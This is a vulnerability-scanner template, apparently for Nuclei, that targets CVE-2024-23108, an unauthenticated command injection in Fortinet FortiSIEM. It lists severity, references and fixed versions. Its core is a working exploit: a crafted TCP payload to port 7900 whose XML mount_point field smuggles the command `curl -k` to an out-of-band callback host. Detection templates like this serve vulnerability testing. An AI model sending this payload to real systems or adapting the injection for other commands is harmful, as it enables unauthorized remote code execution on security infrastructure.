id: CVE-2024-23108
info:
  author: thacien
  classification:
    cpe: cpe:2.3:a:fortinet:fortisiem:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-23108
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-score: 0.00078
  description: An improper neutralization of special elements used in an os command
    ('os command injection') in Fortinet FortiSIEM version 7.1.0 through 7.1.1, 7.0.0
    through 7.0.2, 6.7.0 through 6.7.8, 6.6.0 through 6.6.3, 6.5.0 through 6.5.2,
    and 6.4.0 through 6.4.2 allows attacker to execute unauthorized code or commands
    via via crafted API requests.
  impact: Successful exploitation of this vulnerability could allow an unauthenticated
    attacker to execute arbitrary code on the affected system.
  name: Fortinet FortiSIEM Unauthenticated 2nd Order Command Injection - CVE-2024-23108
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-23108
  - https://github.com/horizon3ai/CVE-2024-23108
  - https://www.horizon3.ai/attack-research/disclosures/cve-2024-23108-fortinet-fortisiem-2nd-order-command-injection-deep-dive
  - https://www.fortiguard.com/psirt/FG-IR-23-130
  remediation: upgrade to FortiSIEM version >=6.4.4, >=6.5.3, >=6.6.4, >=6.7.9, >=7.0.3,
    >=7.1.2
  severity: critical
metadata:
  max-request: 1
  product: fortisiem
  tags: CVE-2024-23108,fortisiem,network,cve,fortinet,rce,tcp,unauth
  vendor: fortinet
  verified: false
tcp:
- host:
  - tls://{{Hostname}}
  inputs:
  - data: '{{hex_decode("{{payload}}") + exploit}}'
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    status:
    - 200
    type: status
  matchers-condition: and
  port: 7900
  read-size: 2048
variables:
- exploit: <TEST_STORAGE type="nfs">\n    <server_ip>127.0.0.1</server_ip>\n    <mount_point>/test;
    curl -k "{{interactsh_url}}";</mount_point>\n</TEST_STORAGE>\n
- payload: '{{51000000 + hex_encode(len("{{exploit}}")) + 0000006f421e4000000000}}'
